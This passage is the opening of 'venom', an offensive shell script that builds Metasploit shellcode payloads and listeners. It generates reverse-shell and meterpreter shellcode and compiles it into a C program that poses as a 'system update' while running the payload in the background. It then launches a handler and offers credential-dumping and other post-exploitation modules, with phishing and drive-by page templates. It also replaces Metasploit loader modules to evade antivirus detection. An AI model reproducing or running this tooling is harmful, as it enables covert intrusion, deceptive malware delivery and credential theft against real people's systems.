#!/bin/sh
# --------------------------------------------------------------
# venom - metasploit Shellcode generator/compiler/listenner
# Author: pedr0 Ubuntu [r00t-3xp10it] version: v1.0.17
# Suspicious-Shell-Activity (SSA) RedTeam develop @2017 - @2020
# codename: Shinigami [ GPL licensed ]
# --------------------------------------------------------------
# [DEPENDENCIES]
# "venom.sh will download/install all dependencies as they are needed"
# Zenity | Metasploit | GCC (unix) |  Pyinstaller (python-to-exe module)
# mingw32 (compile .EXE executables) | pyherion.py (crypter)
# PEScrambler.exe (PE obfuscator/scrambler) | apache2 webserver
# vbs-obfuscator | encrypt_PolarSSL | ettercap (dns_spoof) | WINE
# --------------------------------------------------------------
# Resize terminal windows size befor running the tool (gnome terminal)
# Special thanks to h4x0r Milton@Barra for this little piece of heaven! :D
resize -s 40 105 > /dev/null



# --------------------
# check if user is root
# ---------------------
if [ $(id -u) != "0" ]; then
  echo "[x] we need to be root to run this script..."
  echo "[x] execute [ sudo ./venom.sh ] on terminal"
  exit
fi



# ------------------------------
# Make sure ZENITY its installed
# ------------------------------
zen=$(which zenity)
if ! [ "$?" -eq "0" ]; then
   echo "[x] zenity............................[ NOT found ]";sleep 12
   echo "[i] Please Wait, installing dependencie...";sleep 2
   sudo apt-get install zenity
   sleep 2;clear
fi



# -----------------------------------
# Colorise shell Script output leters
# -----------------------------------
Colors() {
Escape="\033";
  white="${Escape}[0m";
  RedF="${Escape}[31m";
  GreenF="${Escape}[32m";
  YellowF="${Escape}[33m";
  BlueF="${Escape}[34m";
  CyanF="${Escape}[36m";
Reset="${Escape}[0m";
}


Colors;
# ----------------------
# variable declarations
# ----------------------
OS=`uname` # grab OS
H0m3=`echo ~` # grab home path
ver="1.0.17" # script version display
C0d3="Shinigami" # version codename display
user=`who | awk {'print $1'}` # grab username
# user=`who | cut -d' ' -f1 | sort | uniq` # grab username
DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
IPATH=`pwd` # grab venom.sh install path (home/username/shell)
# ------------------------------------------------------------------------
# funtions [templates] to be injected with shellcode
# ------------------------------------------------------------------------
Ch4Rs="$IPATH/output/chars.raw" # shellcode raw output path
InJEc="$IPATH/templates/exec.c" # exec script path
InJEc2="$IPATH/templates/exec.py" # exec script path
InJEc3="$IPATH/templates/exec_bin.c" # exec script path
InJEc4="$IPATH/templates/exec.rb" # exec script path
InJEc5="$IPATH/templates/exec_dll.c" # exec script path
InJEc6="$IPATH/templates/hta_attack/exec.hta" # exec script path
InJEc7="$IPATH/templates/hta_attack/index.html" # hta index path
InJEc8="$IPATH/templates/InvokePS1.bat" # invoke-shellcode script path
InJEc9="$IPATH/templates/exec0.py" # exec script path
InJEc10="$IPATH/templates/InvokeMeter.bat" # exec script path
InJEc11="$IPATH/templates/exec.php" # php script path
# phishing webpages to trigger RCE or downloads
InJEc12="$IPATH/templates/phishing/mega.html" # fake webpage script path
InJEc13="$IPATH/templates/phishing/driveBy.html" # fake webpage script path
InJEc14="$IPATH/templates/hta_attack/index.html" # fake webpage script path
InJEc15="$IPATH/templates/exec_psh.c" # c script path
InJEc16="$IPATH/templates/exec.jar" # jar script path


# -------------------------------------------
# SETTINGS FILE FUNTION (venom-main/settings)
# -------------------------------------------
ChEk=`cat settings | egrep -m 1 "MSF_REBUILD" | cut -d '=' -f2` > /dev/null 2>&1
MsFu=`cat settings | egrep -m 1 "MSF_UPDATE" | cut -d '=' -f2` > /dev/null 2>&1
ApAcHe=`cat settings | egrep -m 1 "APACHE_WEBROOT" | cut -d '=' -f2` > /dev/null 2>&1
D0M4IN=`cat settings | egrep -m 1 "MEGAUPLOAD_DOMAIN" | cut -d '=' -f2` > /dev/null 2>&1
DrIvC=`cat settings | egrep -m 1 "WINE_DRIVEC" | cut -d '=' -f2` > /dev/null 2>&1
MsFlF=`cat settings | egrep -m 1 "MSF_LOGFILES" | cut -d '=' -f2` > /dev/null 2>&1
PyIn=`cat settings | egrep -m 1 "PYTHON_VERSION" | cut -d '=' -f2` > /dev/null 2>&1
PiWiN=`cat settings | egrep -m 1 "PYINSTALLER_VERSION" | cut -d '=' -f2` > /dev/null 2>&1
pHanTom=`cat settings | egrep -m 1 "POST_EXPLOIT_DIR" | cut -d '=' -f2` > /dev/null 2>&1
ArCh=`cat settings | egrep -m 1 "SYSTEM_ARCH" | cut -d '=' -f2` > /dev/null 2>&1
UUID_RANDOM_LENGTH="70" # build 23 uses random keys (comments) to evade signature detection (default 70)
EnV=`hostnamectl | grep Chassis | awk {'print $2'}` > /dev/null 2>&1


# --------------------------------------------
# Config user system correct arch (wine+mingw)
# --------------------------------------------
if [ "$ArCh" = "x86" ]; then
   arch="wine"
   PgFi="Program Files"
   ComP="i586-mingw32msvc-gcc"
elif [ "$ArCh" = "x64" ]; then
   arch="wine64"
   PgFi="Program Files"
   ComP="i686-w64-mingw32-gcc"
else
   echo "${RedF}[x]${white} ERROR: Wrong value input: [ $ArCh ]: not accepted ..${Reset}"
   echo "${RedF}[x]${white} Edit [ settings ] File and Set the var: SYSTEM_ARCH= ${Reset}"
   exit
fi


# -----------------------------------------
# msf postgresql database connection check?
# -----------------------------------------
if [ "$ChEk" = "ON" ]; then
echo ${BlueF}
cat << !
    ╔─────────────────────────────────────────────────╗
    |  postgresql metasploit database connection fix  |
    ╚─────────────────────────────────────────────────╝
!

  #
  # start msfconsole to check postgresql connection status
  #
  service postgresql start
  echo ${BlueF}[☠]${white} Checking msfdb connection status ..${Reset}
  ih=`msfconsole -q -x 'db_status; exit -y' | awk {'print $3'}`
  if [ "$ih" != "connected" ]; then
    echo ${RedF}[x]${white} postgresql selected, no connection ..${Reset}
    echo ${BlueF}[☠]${white} Please wait, rebuilding msf database ..${Reset}
    # rebuild msf database (database.yml)
    echo ""
    msfdb reinit | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Rebuild metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    echo ""
    echo ${BlueF}[✔]${white} postgresql connected to msf ..${Reset}
    sleep 2
  else
    echo ${BlueF}[✔]${white} postgresql connected to msf ..${Reset}
    sleep 2
  fi
fi


# -----------------------------------------------
# update metasploit database before running tool?
# -----------------------------------------------
if [ "$MsFu" = "ON" ]; then
echo ${BlueF}
cat << !
    ╔─────────────────────────────────────────────────╗
    | please wait fetching latest metasploit modules  |
    ╚─────────────────────────────────────────────────╝
!
  xterm -T " UPDATING MSF DATABASE " -geometry 110x23 -e "msfconsole -x 'msfupdate; exit -y' && sleep 2"
fi


# -----------------------------------------------
# venom framework configurated to store logfiles?
# -----------------------------------------------
if [ "$MsFlF" = "ON" ]; then
echo ${BlueF}
cat << !
    ╔─────────────────────────────────────────────────╗
    | venom framework configurated to store logfiles  |
    ╚─────────────────────────────────────────────────╝
!
sleep 2
fi


# ---------------------------------------------
# grab Operative System distro to store IP addr
# output = Ubuntu OR Kali OR Parrot OR BackBox
# ---------------------------------------------
InT3R=`netstat -r | grep "default" | awk {'print $8'}` # grab interface in use
case $DiStR0 in
    Kali) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Debian) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Mint) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}' | cut -d ':' -f2`;;
    Ubuntu) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    Parrot) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    BackBox) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    elementary) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    *) IP=`zenity --title="☠ Input your IP addr ☠" --text "example: 192.168.1.68" --entry --width 300`;;
  esac
clear


# ------------------------------------
# end of script internal settings and
# display credits befor running module
# ------------------------------------
#                  - CodeName: $C0d3 -
echo ${BlueF} && clear && cat << !
                              
               __    _ ______  ____   _  _____  ____    __  
              \  \  //|   ___||    \ | |/     \|    \  /  |
               \  \// |   ___||     \| ||     ||     \/   |
                \__/  |______||__/\____|\_____/|__/\__/|__|
!
echo "${RedF}     Shellcode/Rat_Generator${white}::${RedF}CodeName${white}::${RedF}$C0d3${white}::${RedF}SSA(redteam @2020)${BlueF}"
echo "    ╔════════════════════════════════════════════════════════════════╗"
echo "    ║  ${YellowF}The main goal of this tool its not to build 'FUD' payloads!${BlueF}   ║"
echo "    ║  ${YellowF}But to give to its users the first glance of how shellcode is${BlueF} ║"
echo "    ║  ${YellowF}build, embedded into one template (any language), obfuscated${BlueF}  ║"
echo "    ║  ${YellowF}(e.g pyherion.py) and compiled into one executable file.${BlueF}      ║"
echo "    ╠════════════════════════════════════════════════════════════════╝"
echo "    | Author: r00t-3xp10it | Suspicious_Shell_Activity (red_team)"
echo "    ╘ VERSION:${YellowF}$ver ${BlueF}USER:${YellowF}$user ${BlueF}INTERFACE:${YellowF}$InT3R ${BlueF}ARCH:${YellowF}$ArCh ${BlueF}DISTRO:${YellowF}$DiStR0"${Reset}
echo "" && echo ""
sleep 1
echo ${BlueF}[☠]${white} Press [${GreenF} ENTER ${white}] to continue ..${Reset}
read op


# -----------------------------------------
# check dependencies (msfconsole + apache2)
# -----------------------------------------
imp=`which msfconsole`
if [ "$?" -eq "0" ]; then
echo "msfconsole found" > /dev/null 2>&1
else
echo ""
echo ${RedF}[x]${white} msfconsole -> not found!${Reset}
echo ${BlueF}[☠]${white} This script requires msfconsole to work!${Reset}
sleep 2
exit
fi

apc=`which apache2`
if [ "$?" -eq "0" ]; then
echo "apache2 found" > /dev/null 2>&1
else
echo ""
echo ${RedF}[x]${white} apache2 -> not found!${Reset}
echo ${BlueF}[☠]${white} This script requires apache2 to work!${Reset}
sleep 2
echo ""
echo ${BlueF}[☠]${white} Please run: cd aux && sudo ./setup.sh${Reset}
echo ${BlueF}[☠]${white} to install all missing dependencies...${Reset}
exit
fi


# --------------------------------------------
# start metasploit/postgresql/apache2 services
# --------------------------------------------
if [ "$DiStR0" = "Kali" ]; then
service postgresql start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
else
/etc/init.d/metasploit start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting metasploit service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
fi
clear


# -----------------------------------------------
# arno0x0x meterpreter loader random bytes stager
# -----------------------------------------------
Chts=`cat settings | egrep -m 1 "RANDOM_STAGER_BYTES" | cut -d '=' -f2` > /dev/null 2>&1
ArNo=`cat settings | egrep -m 1 "METERPRETER_STAGER" | cut -d '=' -f2` > /dev/null 2>&1
if [ "$Chts" = "ON" ]; then
  if [ -e "$IPATH/obfuscate/meterpreter_loader.rb" ]; then
    echo ${BlueF}[${GreenF}✔${BlueF}]${white} arno0x0x meterpreter loader random bytes stager: active ..${Reset}
    sleep 2
  else
echo ${BlueF}
cat << !
    ╔═════════════════════════════════════════════════════════════════════╗
    ║  arno0x0x meterpreter_loader random bytes stager av bypass technic  ║
    ║                              ---                                    ║
    ║ This setting forces venom toolkit at startup to backup/replace the  ║
    ║ msf meterpreter_loader.rb (x86) and is counter part (x64) adding an ║
    ║ arbitrary number of random bytes at the beginning of the stage being║
    ║sent back to the stager in an attempt to evade AV signature detection║
    ╚═════════════════════════════════════════════════════════════════════╝

!
sleep 2
    # backup msf modules
    echo ${BlueF}[☠]${white} Backup default msf modules ..${Reset}
    sleep 1
    echo "$ArNo/meterpreter_loader.rb"
    cp $ArNo/meterpreter_loader.rb $IPATH/obfuscate/meterpreter_loader.rb
    echo "$ArNo/x64/meterpreter_loader.rb"
    cp $ArNo/x64/meterpreter_loader.rb $IPATH/obfuscate/meterpreter_loader_64.rb
    # replace default modules
    echo ${BlueF}[☠]${white} Replace default modules by venom modules ..${Reset}
    sleep 1
    cp $IPATH/aux/msf/meterpreter_loader.rb $ArNo/meterpreter_loader.rb > /dev/null 2>&1
    cp $IPATH/aux/msf/meterpreter_loader_64.rb $ArNo/x64/meterpreter_loader.rb > /dev/null 2>&1
    # start postgresql + reload msfdb
    echo ${BlueF}[☠]${white} Rebuild/Reload msf database ..${Reset}
    sleep 1
    msfdb reinit | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Rebuild metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    msfconsole -q -x 'reload_all; exit -y' | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Reload metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    echo ${BlueF}[${GreenF}✔${BlueF}]${white} arno0x0x meterpreter loader random bytes stager: active ..${Reset}
    sleep 2
  fi
fi
clear


# ----------------------------------
# bash trap ctrl-c and call ctrl_c()
# ----------------------------------
trap ctrl_c INT
ctrl_c() {
echo "${RedF}[x]${white} CTRL+C PRESSED -> ABORTING TASKS!"${Reset}
sleep 1
echo ${BlueF}[☠]${white} Cleanning temp generated files...${Reset}
# just in case :D !!!
# revert [templates] backup files to default stages
mv $IPATH/templates/exec[bak].c $InJEc > /dev/null 2>&1
mv $IPATH/templates/exec[bak].py $InJEc2 > /dev/null 2>&1
mv $IPATH/templates/exec_bin[bak].c $InJEc3 > /dev/null 2>&1
mv $IPATH/templates/exec[bak].rb $InJEc4 > /dev/null 2>&1
mv $IPATH/templates/exec_dll[bak].c $InJEc5 > /dev/null 2>&1
mv $IPATH/templates/hta_attack/exec[bak].hta $InJEc6 > /dev/null 2>&1
mv $IPATH/templates/hta_attack/index[bak].html $InJEc7 > /dev/null 2>&1
mv $IPATH/templates/InvokePS1[bak].bat $InJEc8 > /dev/null 2>&1
mv $IPATH/templates/exec0[bak].py $InJEc9 > /dev/null 2>&1
mv $IPATH/templates/exec[bak].php $InJEc11 > /dev/null 2>&1
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/phishing/driveBy[bak].html $InJEc13 > /dev/null 2>&1
mv $IPATH/templates/web_delivery[bak].bat $IPATH/templates/web_delivery.bat > /dev/null 2>&1
mv $IPATH/templates/evil_pdf/PDF-encoder[bak].py PDF-encoder.py > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
mv $IPATH/aux/persistence2[bak].rc $IPATH/aux/persistence2.rc > /dev/null 2>&1
mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
mv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
# delete temp generated files
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/templates/trigger.raw > /dev/null 2>&1
rm $IPATH/templates/obfuscated.raw > /dev/null 2>&1
rm $IPATH/templates/copy.c > /dev/null 2>&1
rm $IPATH/templates/copy2.c > /dev/null 2>&1
rm $IPATH/templates/final.c > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $IPATH/output/sedding.raw > /dev/null 2>&1
rm $IPATH/output/payload.raw > /dev/null 2>&1
rm $IPATH/templates/evil_pdf/template.raw > /dev/null 2>&1
rm $IPATH/templates/evil_pdf/template.c > /dev/null 2>&1
rm $IPATH/bin/*.ps1 > /dev/null 2>&1
rm $IPATH/bin/*.vbs > /dev/null 2>&1
rm -r $H0m3/.psploit > /dev/null 2>&1
rm $IPATH/bin/sedding.raw > /dev/null 2>&1
rm $IPATH/obfuscate/final.vbs > /dev/null 2>&1
# delete temp files from apache webroot
rm $ApAcHe/installer.bat > /dev/null 2>&1
rm $ApAcHe/trigger.sh > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/*.apk > /dev/null 2>&1
rm $ApAcHe/*.exe > /dev/null 2>&1
rm $ApAcHe/*.py > /dev/null 2>&1
rm $ApAcHe/*.bat > /dev/null 2>&1
rm $ApAcHe/*.deb > /dev/null 2>&1
# delete pyinstaller temp files
rm $IPATH/*.spec > /dev/null 2>&1
rm -r $IPATH/dist > /dev/null 2>&1
rm -r $IPATH/build > /dev/null 2>&1
# delete rtf files
rm /tmp/shell.exe > /dev/null 2>&1
rm $ApAcHe/shell.exe > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/$N4m.rtf > /dev/null 2>&1
# icmp (ping) shell
if [ "$ICMPDIS" = "disabled" ]; then
   echo "${RedF}[x]${white} Local ICMP Replies are disable (enable ICMP replies)${white}"
   sysctl -w net.ipv4.icmp_echo_ignore_all=0 >/dev/null 2>&1
fi
rm $ApAcHe/$N4m.zip > /dev/null 2>&1
rm $ApAcHe/$N4m.bat > /dev/null 2>&1
rm $ApAcHe/icmpsh.exe > /dev/null 2>&1
# exit venom.sh
echo ${BlueF}[☠]${white} Exit Shellcode Generator...${Reset}
echo ${BlueF}[☠]${white} [_Codename:$C0d3]${Reset}
sleep 1
if [ "$DiStR0" = "Kali" ]; then
service postgresql stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
else
/etc/init.d/metasploit stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop metasploit service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
fi
cd $IPATH
cd ..
sudo chown -hR $user shell > /dev/null 2>&1


# -----------------------
# arno0x0x av obfuscation
# ----------------------
if [ "$Chts" = "ON" ]; then
  if [ -e "$IPATH/obfuscate/meterpreter_loader.rb" ]; then
    # backup msf modules
    echo ${BlueF}[${GreenF}✔${BlueF}]${white} arno0x0x meterpreter loader random bytes stager: revert ..${Reset}
    echo ${BlueF}[☠]${white} Revert default msf modules ..${Reset}
    sleep 1
    cp $IPATH/obfuscate/meterpreter_loader.rb $ArNo/meterpreter_loader.rb
    cp $IPATH/obfuscate/meterpreter_loader_64.rb $ArNo/x64/meterpreter_loader.rb
    rm $IPATH/obfuscate/meterpreter_loader.rb
    rm $IPATH/obfuscate/meterpreter_loader_64.rb
    # reload msfdb
    echo ${BlueF}[☠]${white} Rebuild/Reload msf database ..${Reset}
    sleep 1
    msfdb reinit | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Rebuild metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    msfconsole -q -x 'reload_all; exit -y' | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Reload metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
  else
    echo ${RedF}[x]${white} no backup msf modules found..${Reset}
    sleep 2
  fi
fi
exit
}



# -------------------------------------------------END OF SCRIPT SETTINGS------------------------------------->




# ---------------------------------------------
# build shellcode in C format
# targets: Apple | BSD | LINUX | SOLARIS
# ---------------------------------------------
sh_shellcode1 () {
# get user input to build shellcode
echo ${BlueF}[☠]${white} Enter shellcode settings!${Reset}
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "linux/ppc/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "linux/x64/shell/reverse_tcp" FALSE "linux/x64/shell_reverse_tcp" FALSE "linux/x64/meterpreter/reverse_tcp" FALSE "osx/armle/shell_reverse_tcp" FALSE "osx/ppc/shell_reverse_tcp" FALSE "osx/x64/shell_reverse_tcp" FALSE "bsd/x86/shell/reverse_tcp" FALSE "bsd/x64/shell_reverse_tcp" FALSE "solaris/x86/shell_reverse_tcp" --width 350 --height 460) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
echo ${BlueF}[☠]${white} editing/backup files...${Reset};

## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="shellcode";fi


echo "${BlueF}[☠]${white} Building shellcode -> C format ..."${Reset};
sleep 2
# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    NAME    : $N4m
    FORMAT  : C -> UNIX
    PAYLOAD : $paylo

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c -o $IPATH/output/chars.raw"
echo ""
# display generated shelcode
cat $IPATH/output/chars.raw
echo ""
sleep 2
# parsing shellcode data
cmd=$(cat $IPATH/output/chars.raw | grep -v "=")


   # check if all dependencies needed are installed
   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "${BlueF}[☠]${white} chars.raw -> found!"${Reset};
      sleep 2 
   else
      echo "${RedF}[x]${white} chars.raw -> not found!"${Reset};
      exit
   fi

   # check if gcc exists
   audit=`which gcc`> /dev/null 2>&1
   if [ "$?" -eq "0" ]; then
      echo "${BlueF}[☠]${white} gcc compiler -> found!"${Reset};
      sleep 2
   else
      echo "${RedF}[x]${white} gcc compiler -> not found!"${Reset};
      echo "${BlueF}[☠]${white} Download compiler -> apt-get install gcc"${Reset};
      echo ""
      sudo apt-get install gcc
      echo ""
   fi


## EDITING/BACKUP FILES NEEDED
cp $InJEc $IPATH/templates/exec[bak].c


# -----------------
# BUILD C TEMPLATE
# -----------------
echo "#include<stdio.h>" > $IPATH/output/exec.c
echo "#include<stdlib.h>" >> $IPATH/output/exec.c
echo "#include<string.h>" >> $IPATH/output/exec.c
echo "#include<sys/types.h>" >> $IPATH/output/exec.c
echo "#include<sys/wait.h>" >> $IPATH/output/exec.c
echo "#include<unistd.h>" >> $IPATH/output/exec.c
echo "" >> $IPATH/output/exec.c
echo "/*" >> $IPATH/output/exec.c
echo "Author: r00t-3xp10it" >> $IPATH/output/exec.c
echo "Framework: venom v1.0.17" >> $IPATH/output/exec.c
echo "gcc -fno-stack-protector -z execstack exec.c -o $N4m" >> $IPATH/output/exec.c
echo "*/" >> $IPATH/output/exec.c
echo "" >> $IPATH/output/exec.c
echo "/* msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c */" >> $IPATH/output/exec.c
echo "unsigned char kungfu[] =" >> $IPATH/output/exec.c
echo "$cmd" >> $IPATH/output/exec.c
echo "" >> $IPATH/output/exec.c
echo "int main()" >> $IPATH/output/exec.c
echo "{" >> $IPATH/output/exec.c
echo "/*" >> $IPATH/output/exec.c
echo "This fork(); function allow us to spawn a new child process (in background). This way i can" >> $IPATH/output/exec.c
echo "execute shellcode in background while continue the execution of the C program in foreground." >> $IPATH/output/exec.c
echo "Article: https://www.geeksforgeeks.org/zombie-and-orphan-processes-in-c" >> $IPATH/output/exec.c
echo "*/" >> $IPATH/output/exec.c
echo "fflush(NULL);" >> $IPATH/output/exec.c
echo "int pid = fork();" >> $IPATH/output/exec.c
echo "   if (pid > 0) {" >> $IPATH/output/exec.c
echo "      /* We are running in parent process (as foreground job). */" >> $IPATH/output/exec.c
echo "      printf(\"Please Wait, Updating system ..\\\n\\\n\");" >> $IPATH/output/exec.c
echo "      /* Display system information onscreen to target user */" >> $IPATH/output/exec.c
echo "      sleep(1);system(\"h=\$(hostnamectl | grep 'Static' | cut -d ':' -f2);echo \\\"Hostname   :\$h\\\"\");" >> $IPATH/output/exec.c
echo "      system(\"k=\$(hostnamectl | grep 'Kernel' | cut -d ':' -f2);echo \\\"Kernel     :\$k\\\"\");" >> $IPATH/output/exec.c
echo "      system(\"b=\$(hostnamectl | grep 'Boot' | cut -d ':' -f2);echo \\\"Boot ID    :\$b\\\"\");" >> $IPATH/output/exec.c
echo "      sleep(2);printf(\"\\\n\");" >> $IPATH/output/exec.c
echo "      system(\"OP=\$(hostnamectl | grep 'Operating' | awk {'print \$3'});echo \\\"Hit:1 http://\$OP.download/\$OP \$OP-rolling/contrib\\\"\");" >> $IPATH/output/exec.c
echo "      printf(\"------------------------------------------------------\\\n\");" >> $IPATH/output/exec.c
echo "      sleep(1);system(\"for i in 1023.8353.9354:/daemon 7384.8400.8112:/etc/apt 3305.6720.2201:/etc/bin 6539.3167.1200:/etc/cron 4739.0473.4370:/etc/systemd 9164.0257.0034:/etc/passwd 1023.2559.0076:/etc/crontab 3945.4401.5037:/etc/fork.sys 4406.4490.2320:/etc/drive.sys 1288.3309.9955:/etc/PSmanager 1992.9909.1234:/etc/synaptic 4856.4845.6677:/etc/sources.list 4400.0079.0001:/etc/shadow;do dt=\$(date|awk {'print \$4,\$5,\$6'});echo \\\"\$dt - PATCHING: \$i\\\" && sleep 1;done\");" >> $IPATH/output/exec.c
echo "      printf(\"------------------------------------------------------\\\n\");" >> $IPATH/output/exec.c
echo "      printf(\"Please Wait, finishing update process ..\\\n\");" >> $IPATH/output/exec.c
echo "      sleep(2);printf(\"Done...\\\n\");" >> $IPATH/output/exec.c
echo "   }" >> $IPATH/output/exec.c
echo "   else if (pid == 0) {" >> $IPATH/output/exec.c
echo "      /* We are running in child process (as backgrond job - orphan). */" >> $IPATH/output/exec.c
echo "      setsid();" >> $IPATH/output/exec.c
echo "      void (*ret)() = (void(*)())kungfu;" >> $IPATH/output/exec.c
echo "      ret();" >> $IPATH/output/exec.c
echo "  } return 0;" >> $IPATH/output/exec.c
echo "}" >> $IPATH/output/exec.c


cd $IPATH/templates
# COMPILING SHELLCODE USING GCC
echo "${BlueF}[☠]${white} Compiling using gcc..."${Reset};
gcc -fno-stack-protector -z execstack $IPATH/output/exec.c -o $IPATH/output/$N4m


## CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m\n\nExecute: sudo ./$N4m\n\nchose how to deliver: $N4m" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 350 --height 305) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo ${BlueF}[☠]${white} Start a multi-handler...${Reset};
      echo ${YellowF}[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell${Reset};
      echo ${BlueF}[☯]${white} Please dont test samples on virus total...${Reset};
        if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log  
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2

   else

P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "linux_hostrecon.rc" FALSE "dump_credentials_linux.rc" FALSE "exploit_suggester.rc" --width 305 --height 260) > /dev/null 2>&1


if [ "$P0" = "dump_credentials_linux.rc" ]; then
  if [ -e "$pHanTom/post/linux/gather/wifi_dump_linux.rb" ]; then
    echo ${GreenF}[✔]${white} wifi_dump_linux.rb -> found${Reset};
    sleep 2
  else
    echo ${RedF}[x]${white} wifi_dump_linux.rb -> not found${Reset};
    sleep 1
    echo ${BlueF}[*]${white} copy post-module to msfdb ..${Reset};
    cp $IPATH/aux/msf/wifi_dump_linux.rb $pHanTom/post/linux/gather/wifi_dump_linux.rb > /dev/null 2>&1
    echo ${BlueF}[☠]${white} Reloading msfdb database ..${Reset};
    sleep 2
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
  fi

elif [ "$P0" = "linux_hostrecon.rc" ]; then
  if [ -e "$pHanTom/post/linux/gather/linux_hostrecon.rb" ]; then
